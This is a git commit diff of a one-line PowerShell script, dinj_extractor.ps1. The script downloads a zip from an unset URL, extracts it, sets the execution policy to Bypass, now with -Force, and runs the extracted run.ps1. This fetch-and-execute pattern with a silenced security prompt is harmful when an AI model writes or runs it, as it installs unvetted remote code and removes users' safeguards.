19b9ea52f0a23c17149cc91c4e1d9bf9f5b4fccb
Mai-x00 <mai.franze@gmail.com>
2024-12-02 22:44:54 +0100

    Updated dinj_extractor.ps1

--- dinj_extractor.ps1
+++ dinj_extractor.ps1
@@ -1,1 +1,1 @@
-$url=""; cd $home; $t = New-TemporaryFile; rni $t.FullName "$($t.BaseName).zip" -PassThru; iwr $url -OutFile "$($t.BaseName).zip"; Expand-Archive "$($t.BaseName).zip" -DestinationPath $t.BaseName; Set-ExecutionPolicy Bypass CurrentUser; cd $t.BaseName; .\run.ps1
+$url=""; cd $home; $t = New-TemporaryFile; rni $t.FullName "$($t.BaseName).zip" -PassThru; iwr $url -OutFile "$($t.BaseName).zip"; Expand-Archive "$($t.BaseName).zip" -DestinationPath $t.BaseName; Set-ExecutionPolicy Bypass CurrentUser -Force; cd $t.BaseName; .\run.ps1
